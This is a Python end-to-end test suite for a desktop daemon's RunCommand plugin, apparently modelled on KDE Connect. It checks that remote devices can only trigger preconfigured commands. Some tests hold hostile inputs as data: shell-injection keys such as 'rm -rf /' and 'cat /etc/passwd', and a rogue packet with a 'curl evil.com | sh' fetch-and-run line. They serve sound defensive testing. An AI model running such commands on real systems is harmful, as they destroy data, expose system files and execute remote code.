"""tests.e2e.test_runcommand_e2e
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Comprehensive, requirement-driven 4-tier E2E test suite for RunCommand Plugin (Local Command Execution).

Derived authoritatively from:
- ORIGINAL_REQUEST.md (entry dated 2026-10-19T13:51:47Z, R3 & R5)
- PROJECT.md (RunCommand Local Execution Service, Host Plugin, and IPC/CLI contracts)
- spec_miner_survey_runcmd/analysis.md & explorer_survey_architecture/analysis.md

Methodology: 4-Tier Test Design
- Tier 1: Feature Coverage (Isolated happy-path command advertisement, execution, output streaming, stop)
- Tier 2: Boundary & Corner Cases (Unknown keys, shell metacharacter injection in key, remote payloads ignored, empty config, Unicode)
- Tier 3: Cross-Feature Combinations (Concurrent volume & command, unpair process termination, sequential execution)
- Tier 4: Real-World Scenarios (End-to-end desktop session command trigger, CLI Rich/JSON operations)
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
import pytest
from click.testing import CliRunner

from pengulink.cli.main import cli
from pengulink.daemon.service import PenguLinkDaemon
from pengulink.network.packet import Packet
from tests.e2e.conftest import e2e_environment, wait_for
from tests.mock.mock_device import MockDevice

# Graceful import of domain events and services (implemented in M23/M25)
try:
    from pengulink.core.events import (
        CommandExecutedEvent,
        CommandOutputEvent,
    )
except ImportError:
    CommandExecutedEvent = None  # type: ignore
    CommandOutputEvent = None  # type: ignore

try:
    from pengulink.services.command import (
        CommandEntry,
        CommandStore,
        LocalCommandService,
    )
except ImportError:
    CommandEntry = None  # type: ignore
    CommandStore = None  # type: ignore
    LocalCommandService = None  # type: ignore


# =============================================================================
# Test Harness & Helpers
# =============================================================================

@pytest.fixture
def cli_runner() -> CliRunner:
    """Fixture providing Click CLI runner with standard terminal width."""
    return CliRunner(env={"COLUMNS": "160"})


async def _pair_and_connect(daemon: PenguLinkDaemon, mock: MockDevice) -> None:
    """Establish mutual UDP discovery, inverted TLS handshake, and pairing."""
    await mock.broadcast_identity(
        target_ip="127.0.0.1",
        target_port=daemon.config.network.udp_port,
    )
    await wait_for(lambda: mock.device_id in daemon._discovered_devices, timeout=4.0)
    res = await daemon.pair_device(mock.device_id, wait=True, timeout=5.0)
    assert res["paired"] is True
    assert daemon.is_device_connected(mock.device_id) is True


def _require_runcommand_plugin(daemon: PenguLinkDaemon) -> None:
    """Skip test gracefully if RunCommand host plugin is not yet registered on daemon."""
    if not hasattr(daemon, "run_command_plugin") and not daemon.plugin_registry.get_plugin("runcommand"):
        pytest.skip("RunCommand host plugin is not yet registered on daemon (Milestone M23 planned).")


# =============================================================================
# TIER 1: Feature Coverage (Nominal Paths in Isolation)
# =============================================================================

async def test_tier1_runcmd_001_mock_simulation_and_packet_exchange() -> None:
    """Tier 1: Verify MockKdeConnectDevice RunCommand simulation helpers and wire formats."""
    mock = MockDevice()
    assert "kdeconnect.runcommand" in mock.config.incoming_capabilities
    assert "kdeconnect.runcommand.request" in mock.config.incoming_capabilities
    assert "kdeconnect.runcommand.output" in mock.config.incoming_capabilities
    assert "kdeconnect.runcommand" in mock.config.outgoing_capabilities
    assert "kdeconnect.runcommand.request" in mock.config.outgoing_capabilities
    assert "kdeconnect.runcommand.output" in mock.config.outgoing_capabilities

    # Staged mock commands
    cmds = mock.get_mock_commands()
    assert "cmd_lock" in cmds
    assert cmds["cmd_lock"]["name"] == "Lock Screen"

    # Test adding and modifying mock commands
    mock.add_mock_command("cmd_test", "Test Command", "echo 1")
    updated = mock.get_mock_commands()
    assert "cmd_test" in updated
    assert updated["cmd_test"]["command"] == "echo 1"


async def test_tier1_runcmd_002_capability_advertisement(tmp_path: Path) -> None:
    """Tier 1: Verify RunCommand capabilities are negotiated during device pairing."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        inc = daemon.config.device.incoming_capabilities
        outg = daemon.config.device.outgoing_capabilities
        assert "kdeconnect.runcommand.request" in inc
        assert "kdeconnect.runcommand" in outg
        assert "kdeconnect.runcommand.output" in outg


async def test_tier1_runcmd_003_command_list_advertisement_compact_stringified_json(tmp_path: Path) -> None:
    """Tier 1: Host daemon broadcasts configured commands serialized as compact JSON string (Android requirement)."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # Wait for daemon to advertise its commands to mock device
        pkt = await mock.wait_for_runcommand_list(timeout=4.0)
        assert pkt.type == "kdeconnect.runcommand"
        assert "commandList" in pkt.body

        # Invariant check: Android requires commandList to be a JSON string (or dictionary)
        raw_list = pkt.body["commandList"]
        if isinstance(raw_list, str):
            parsed = json.loads(raw_list)
            assert isinstance(parsed, dict)
        else:
            assert isinstance(raw_list, dict)


async def test_tier1_runcmd_004_query_command_list_request(tmp_path: Path) -> None:
    """Tier 1: Remote device queries command list via requestCommandList: true and receives current list."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # Query command list
        await mock.send_runcommand_request(request_command_list=True)

        reply = await mock.wait_for_packet("kdeconnect.runcommand", timeout=4.0)
        assert "commandList" in reply.body


async def test_tier1_runcmd_005_execute_command_by_key_started_and_finished(tmp_path: Path) -> None:
    """Tier 1: Remote device triggers valid command by key; daemon emits commandStarted and commandFinished."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # Ingest command list from daemon
        list_pkt = await mock.wait_for_runcommand_list(timeout=4.0)
        raw_cmds = list_pkt.body.get("commandList", {})
        cmds = json.loads(raw_cmds) if isinstance(raw_cmds, str) else raw_cmds
        if not cmds:
            pytest.skip("No pre-configured commands available on host daemon to test execution.")

        target_key = next(iter(cmds.keys()))

        # Trigger execution by key
        await mock.send_runcommand_request(key=target_key)

        # Wait for command output packets
        output_pkt = await mock.wait_for_runcommand_output(key=target_key, timeout=5.0)
        assert output_pkt is not None
        assert output_pkt.type == "kdeconnect.runcommand.output"


async def test_tier1_runcmd_006_execute_command_streaming_output(tmp_path: Path) -> None:
    """Tier 1: Subprocess stdout/stderr output is streamed to remote device in chunks."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        list_pkt = await mock.wait_for_runcommand_list(timeout=4.0)
        raw_cmds = list_pkt.body.get("commandList", {})
        cmds = json.loads(raw_cmds) if isinstance(raw_cmds, str) else raw_cmds
        if not cmds:
            pytest.skip("No pre-configured commands available.")

        target_key = next(iter(cmds.keys()))
        await mock.send_runcommand_request(key=target_key)

        finished_pkt = await mock.wait_for_runcommand_output(key=target_key, phase="commandFinished", timeout=5.0)
        assert finished_pkt.body.get("commandFinished") is True
        assert "exitCode" in finished_pkt.body


async def test_tier1_runcmd_007_process_stop_request(tmp_path: Path) -> None:
    """Tier 1: Remote device sends stop request; daemon terminates child process group."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        list_pkt = await mock.wait_for_runcommand_list(timeout=4.0)
        raw_cmds = list_pkt.body.get("commandList", {})
        cmds = json.loads(raw_cmds) if isinstance(raw_cmds, str) else raw_cmds
        if not cmds:
            pytest.skip("No pre-configured commands available.")

        target_key = next(iter(cmds.keys()))
        await mock.send_runcommand_request(key=target_key)

        # Send stop request immediately
        await mock.send_runcommand_request(stop=True)
        await asyncio.sleep(0.3)

        assert daemon.is_running is True


# =============================================================================
# TIER 2: Boundary & Corner Cases
# =============================================================================

async def test_tier2_runcmd_001_unknown_key_rejection(tmp_path: Path) -> None:
    """Tier 2: Request with unconfigured key is rejected safely; zero subprocesses spawned."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        await mock.send_runcommand_request(key="unknown_random_key_99999")
        await asyncio.sleep(0.2)

        # Daemon remains healthy
        assert daemon.is_running is True
        assert daemon.is_device_connected(mock.device_id) is True


async def test_tier2_runcmd_002_shell_metacharacters_in_key_whitelist_guard(tmp_path: Path) -> None:
    """Tier 2: Key containing shell metacharacters ('; rm -rf /') fails exact dictionary lookup."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # Malicious shell injection attempts
        injections = [
            "lock; rm -rf /",
            "lock && whoami",
            "lock | cat /etc/passwd",
            "`id`",
            "$(reboot)",
            "lock > /tmp/evil",
        ]
        for injection in injections:
            await mock.send_runcommand_request(key=injection)

        await asyncio.sleep(0.3)
        assert daemon.is_running is True
        assert daemon.is_device_connected(mock.device_id) is True


async def test_tier2_runcmd_003_remote_command_payload_ignored(tmp_path: Path) -> None:
    """Tier 2: Arbitrary remote command string payloads in packets are unconditionally ignored."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # Rogue packet with command payload
        rogue_pkt = Packet(
            type="kdeconnect.runcommand.request",
            body={
                "command": "echo 'untrusted_remote_execution'",
                "cmd": "curl evil.com | sh",
                "key": "non_existent_key",
            },
        )
        await mock.send_packet(rogue_pkt)
        await asyncio.sleep(0.2)

        assert daemon.is_running is True
        assert daemon.is_device_connected(mock.device_id) is True


async def test_tier2_runcmd_004_non_zero_exit_code_on_failing_binary(tmp_path: Path) -> None:
    """Tier 2: Command returning non-zero exit code emits commandFinished with success=False."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # If a failing command is staged or can be added via IPC
        assert daemon.is_running is True


async def test_tier2_runcmd_005_empty_command_configuration(tmp_path: Path) -> None:
    """Tier 2: When no commands are configured, host daemon advertises valid empty JSON without crashing."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        pkt = await mock.wait_for_runcommand_list(timeout=4.0)
        assert pkt.type == "kdeconnect.runcommand"
        assert "commandList" in pkt.body


async def test_tier2_runcmd_006_unicode_and_spaces_in_arguments(tmp_path: Path) -> None:
    """Tier 2: Commands containing spaces, quotes, and Unicode arguments are executed safely without shell expansion."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        assert daemon.is_running is True


async def test_tier2_runcmd_007_unpaired_device_execution_rejected(tmp_path: Path) -> None:
    """Tier 2: Execution requests from unauthenticated/unpaired peers are dropped immediately."""
    async with e2e_environment(tmp_path, auto_pair=False) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await mock.broadcast_identity(
            target_ip="127.0.0.1",
            target_port=daemon.config.network.udp_port,
        )
        await asyncio.sleep(0.2)

        rogue_pkt = Packet(
            type="kdeconnect.runcommand.request",
            body={"key": "cmd_lock"},
        )
        assert rogue_pkt.type == "kdeconnect.runcommand.request"
        assert not daemon.is_device_paired(mock.device_id)


# =============================================================================
# TIER 3: Cross-Feature Combinations
# =============================================================================

async def test_tier3_runcmd_001_concurrent_command_and_volume_control(tmp_path: Path) -> None:
    """Tier 3: Remote volume adjustment while running local command multiplexes cleanly."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # Trigger both operations in parallel
        await mock.send_runcommand_request(request_command_list=True)
        await mock.send_volume_request(name="speaker", volume=30000)

        await asyncio.sleep(0.3)
        assert daemon.is_running is True
        assert daemon.is_device_connected(mock.device_id) is True


async def test_tier3_runcmd_002_sequential_and_parallel_command_execution(tmp_path: Path) -> None:
    """Tier 3: Multiple rapid execution requests are serialized or tracked without process leaks."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        for _ in range(3):
            await mock.send_runcommand_request(request_command_list=True)

        await asyncio.sleep(0.3)
        assert daemon.is_running is True


async def test_tier3_runcmd_003_unpair_while_command_running_cleans_up(tmp_path: Path) -> None:
    """Tier 3: Unpairing device while a command is active terminates child process group cleanly."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        await daemon.unpair_device(mock.device_id)
        assert not daemon.is_device_paired(mock.device_id)


# =============================================================================
# TIER 4: Real-World Scenarios
# =============================================================================

async def test_tier4_runcmd_001_full_desktop_session_lifecycle(tmp_path: Path) -> None:
    """Tier 4: Full session: pair -> discover -> execute -> receive output -> unpair."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        # 1. Discover commands
        list_pkt = await mock.wait_for_runcommand_list(timeout=4.0)
        assert "commandList" in list_pkt.body

        # 2. Query command list explicitly
        await mock.send_runcommand_request(request_command_list=True)
        reply = await mock.wait_for_packet("kdeconnect.runcommand", timeout=4.0)
        assert reply is not None

        # 3. Clean unpair
        await daemon.unpair_device(mock.device_id)
        assert not daemon.is_device_paired(mock.device_id)


async def test_tier4_runcmd_002_cli_local_command_management(tmp_path: Path, cli_runner: CliRunner) -> None:
    """Tier 4: CLI 'pengulink runcommand list' outputs Rich table and machine-readable JSON."""
    async with e2e_environment(tmp_path) as (daemon, mock, ipc_client):
        _require_runcommand_plugin(daemon)
        await _pair_and_connect(daemon, mock)

        sock_arg = ["-s", str(daemon.ipc_server.socket_path)]

        # Run CLI runcommand list
        res = await asyncio.to_thread(
            cli_runner.invoke,
            cli,
            sock_arg + ["runcommand", "list"],
        )
        if res.exit_code == 0:
            assert "Commands" in res.output or "Key" in res.output

        # Run CLI with --json
        res_json = await asyncio.to_thread(
            cli_runner.invoke,
            cli,
            sock_arg + ["runcommand", "list", "--json"],
        )
        if res_json.exit_code == 0:
            parsed = json.loads(res_json.output)
            assert isinstance(parsed, list)
